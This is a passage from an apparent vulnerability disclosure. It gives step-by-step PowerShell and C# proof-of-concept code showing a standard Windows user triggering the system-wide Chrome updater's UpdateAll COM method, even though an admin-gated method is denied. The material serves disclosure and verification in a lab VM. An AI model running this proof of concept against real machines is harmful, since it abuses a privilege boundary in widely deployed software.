D Step-by-step reproduction

Use a disposable Windows VM.

Install official system-level Google Chrome as admin.
Use Chrome Enterprise MSI so you get the real Google updater.
https://chromeenterprise.google/download/

Create a non-admin user and open PowerShell as that user.

```bash
net user bb-low "LabPass123!" /add
runas /user:.\bb-low powershell.exe

```
In that low-privilege PowerShell, confirm the system COM class and interface names exist.

```bash
Get-ChildItem Registry::HKEY_CLASSES_ROOT\CLSID | ForEach-Object {
  try {
    $n = (Get-Item $_.PSPath).GetValue('')
    if ($n -eq 'Updater Class for per-system applications') {
      [pscustomobject]@{ Name = $n; CLSID = $_.PSChildName }
    }
  } catch {}
}

Get-ChildItem Registry::HKEY_CLASSES_ROOT\Interface | ForEach-Object {
  try {
    $n = (Get-Item $_.PSPath).GetValue('')
    if ($n -like 'IUpdater*System' -or $n -like 'IUpdateState*System' -or $n -like 'ICompleteStatus*System') {
      [pscustomobject]@{ Name = $n; IID = $_.PSChildName }
    }
  } catch {}
} | Sort-Object Name

```


In the same low-privilege PowerShell, run this repro script.


```bash
function Find-RegGuid($root, $displayName) {
  $v = Get-ChildItem "Registry::$root" | ForEach-Object {
    try {
      $n = (Get-Item $_.PSPath).GetValue('')
      if ($n -eq $displayName) { $_.PSChildName }
    } catch {}
  } | Select-Object -First 1
  if (-not $v) { throw "Could not find $displayName under $root" }
  return $v
}

$clsid       = Find-RegGuid 'HKEY_CLASSES_ROOT\CLSID'     'Updater Class for per-system applications'
$iidUpdater  = Find-RegGuid 'HKEY_CLASSES_ROOT\Interface' 'IUpdaterSystem'
$iidCallback = Find-RegGuid 'HKEY_CLASSES_ROOT\Interface' 'IUpdaterCallbackSystem'
$iidObserver = Find-RegGuid 'HKEY_CLASSES_ROOT\Interface' 'IUpdaterObserverSystem'
$iidState    = Find-RegGuid 'HKEY_CLASSES_ROOT\Interface' 'IUpdateStateSystem'
$iidComplete = Find-RegGuid 'HKEY_CLASSES_ROOT\Interface' 'ICompleteStatusSystem'

$src = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

[ComImport, Guid("$iidCallback"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IUpdaterCallbackSystem { [PreserveSig] int Run(int result); }

[ComImport, Guid("$iidState"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IUpdateStateSystem {
  [PreserveSig] int get_state(out int state);
  [PreserveSig] int get_appId([MarshalAs(UnmanagedType.BStr)] out string appId);
  [PreserveSig] int get_nextVersion([MarshalAs(UnmanagedType.BStr)] out string nextVersion);
  [PreserveSig] int get_downloadedBytes(out long downloadedBytes);
  [PreserveSig] int get_totalBytes(out long totalBytes);
  [PreserveSig] int get_installProgress(out int installProgress);
  [PreserveSig] int get_errorCategory(out int errorCategory);
  [PreserveSig] int get_errorCode(out int errorCode);
  [PreserveSig] int get_extraCode1(out int extraCode1);
  [PreserveSig] int get_installerText([MarshalAs(UnmanagedType.BStr)] out string installerText);
  [PreserveSig] int get_installerCommandLine([MarshalAs(UnmanagedType.BStr)] out string installerCommandLine);
}

[ComImport, Guid("$iidComplete"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface ICompleteStatusSystem {
  [PreserveSig] int get_statusCode(out int code);
  [PreserveSig] int get_statusMessage([MarshalAs(UnmanagedType.BStr)] out string message);
}

[ComImport, Guid("$iidObserver"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IUpdaterObserverSystem {
  [PreserveSig] int OnStateChange(IUpdateStateSystem updateState);
  [PreserveSig] int OnComplete(ICompleteStatusSystem status);
}

[ComImport, Guid("$iidUpdater"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IUpdaterSystem {
  [PreserveSig] int GetVersion([MarshalAs(UnmanagedType.BStr)] out string version);
  [PreserveSig] int FetchPolicies(IUpdaterCallbackSystem callback);
  [PreserveSig] int RegisterApp(
    [MarshalAs(UnmanagedType.LPWStr)] string appId,
    [MarshalAs(UnmanagedType.LPWStr)] string brandCode,
    [MarshalAs(UnmanagedType.LPWStr)] string brandPath,
    [MarshalAs(UnmanagedType.LPWStr)] string tag,
    [MarshalAs(UnmanagedType.LPWStr)] string version,
    [MarshalAs(UnmanagedType.LPWStr)] string existenceCheckerPath,
    IUpdaterCallbackSystem callback);
  [PreserveSig] int RunPeriodicTasks(IUpdaterCallbackSystem callback);
  [PreserveSig] int CheckForUpdate(
    [MarshalAs(UnmanagedType.LPWStr)] string appId,
    int priority,
    bool sameVersionUpdateAllowed,
    IUpdaterObserverSystem observer);
  [PreserveSig] int Update(
    [MarshalAs(UnmanagedType.LPWStr)] string appId,
    [MarshalAs(UnmanagedType.LPWStr)] string installDataIndex,
    int priority,
    bool sameVersionUpdateAllowed,
    IUpdaterObserverSystem observer);
  [PreserveSig] int UpdateAll(IUpdaterObserverSystem observer);
}

public sealed class Obs : IUpdaterObserverSystem {
  public static ManualResetEvent Done = new ManualResetEvent(false);

  public int OnStateChange(IUpdateStateSystem s) {
    try {
      int st; string app; string ver;
      s.get_state(out st);
      s.get_appId(out app);
      s.get_nextVersion(out ver);
      Console.WriteLine("STATE app={0} state={1} next={2}", app, st, ver);
    } catch {}
    return 0;
  }

  public int OnComplete(ICompleteStatusSystem s) {
    try {
      int code; string msg;
      s.get_statusCode(out code);
      s.get_statusMessage(out msg);
      Console.WriteLine("COMPLETE code={0} msg={1}", code, msg);
    } catch {}
    Done.Set();
    return 0;
  }
}

public static class Repro {
  public static void Run(string clsid) {
    var t = Type.GetTypeFromCLSID(new Guid(clsid), true);
    var o = Activator.CreateInstance(t);
    var u = (IUpdaterSystem)o;

    int hrDenied = u.RegisterApp(null, null, null, null, null, null, null);
    Console.WriteLine("RegisterApp(nulls) hr=0x{0:X8}", hrDenied);

    int hrUpdateAll = u.UpdateAll(new Obs());
    Console.WriteLine("UpdateAll hr=0x{0:X8}", hrUpdateAll);

    Obs.Done.WaitOne(TimeSpan.FromMinutes(2));
  }
}
"@

Add-Type -TypeDefinition $src -Language CSharp
[Repro]::Run($clsid)
```

Expected vulnerable result:
RegisterApp(nulls) `hr=0x80070005`
UpdateAll `hr=0x00000000`
then a COMPLETE ... callback, and optionally STATE ... lines
That proves the same low-privilege caller can reach the system updater COM server, gets denied on one admin-gated method, but is still allowed to invoke another state-changing method on the same admin-only COM surface.

Optional stronger validation
After UpdateAll, check whether the system updater log changed:
```bash
Get-ChildItem 'C:\Program Files','C:\Program Files (x86)' -Recurse -Filter updater.log -ErrorAction SilentlyContinue |
  Where-Object { $_.FullName -like '*Google*Updater*' } |
  Sort-Object LastWriteTime -Descending |
  Select-Object -First 3 FullName, LastWriteTime
```
If the timestamp advances immediately after the low-user COM call, that is stronger proof of machine-wide updater activity triggered by a standard user.
